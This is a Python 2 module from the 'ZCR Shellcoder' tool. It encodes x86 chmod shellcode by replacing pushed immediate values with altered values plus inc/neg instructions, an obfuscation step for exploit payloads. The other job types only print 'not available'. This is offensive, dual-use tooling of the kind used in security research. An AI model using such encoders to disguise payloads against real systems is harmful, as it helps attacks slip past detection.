#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
def start(type,shellcode,job):
	if 'chmod(' in job:	
		eax = str('0x0f')
		times = int(type.rsplit('inc_')[1])
		eax_2 = '%x'%(int('0f',16))
		n = 0
		while n<times:
			eax_2 = '%x'%(int(eax_2,16) - int('01',16))
			n+= 1
		eax = 'push   $%s'%(str(eax))
		inc_str = '\ninc %eax' * times
		neg = 0
		if '-' in eax_2:
			eax_2 = eax_2.replace('-','')
			neg = 1
		if neg is 0:
			eax_inc = 'push $0x%s\npop %%eax%s\npush %%eax'%(eax_2,inc_str)
			plus = times - 1
		if neg is 1:
			eax_inc = 'push $0x%s\npop %%eax\nneg %%eax%s\npush %%eax'%(eax_2,inc_str)
			plus = times
		shellcode = shellcode.replace(eax,eax_inc)
		ecx = str(shellcode.rsplit('\n')[5+plus])
		ecx_value = str(shellcode.rsplit('\n')[5+plus].rsplit()[1][1:])
		ecx_2 = "%x" % (int(ecx_value, 16))
		n = 0
		while n<times:
			ecx_2 = '%x'%(int(ecx_2,16) - int('01',16))
			n+= 1
		neg = 0
		inc_str = '\ninc %ebx' * times
		if '-' in ecx_2:
			ecx_2 = ecx_2.replace('-','')
			neg = 1
		if neg is 0:
			ecx_inc = 'push $0x%s\npop %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),inc_str)
		if neg is 1:
			ecx_inc = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),inc_str)
		shellcode = shellcode.replace(ecx,ecx_inc)
		n = 0
		start = ''
		middle = ''
		end = ''
		add = 0
		for l in shellcode.rsplit('\n'):
			n += 1
			if add is 0:
				if '_z3r0d4y_' not in l:
					start += l + '\n'
				else:
					add = 1
			if add is 1:
				if '_z3r0d4y_' not in l:
					if '%esp,%ebx' not in l:
						middle += l + '\n'
					else:
						add = 2
			if add is 2:
				end += l + '\n'
		for l in middle.rsplit('\n'):
			if 'push $0x' in l:
				ebx = l.rsplit()[1][1:]
				ebx_2 = "%x" % (int(ebx, 16))
				n = 0 
				while n<times:
					ebx_2 = '%x'%(int(ebx_2,16) - int('01',16))
					n+=1
				inc_str = '\ninc %ebx' * times
				neg = 0 
				if '-' in ebx_2:
					ecx_2 = ecx_2.replace('-','')
					neg = 1
				if neg is 0:
					command = 'push $0x%s\npop %%ebx%s\npush %%ebx'%(str(ebx_2),inc_str)
				if neg is 1:
					command = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx'%(str(ebx_2),inc_str)
				middle = middle.replace(l,command)
		shellcode = start + middle + end
	if 'dir_create(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'download_execute(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'download(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'exc(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'file_create(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'script_executor(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'system(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'write(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	return shellcode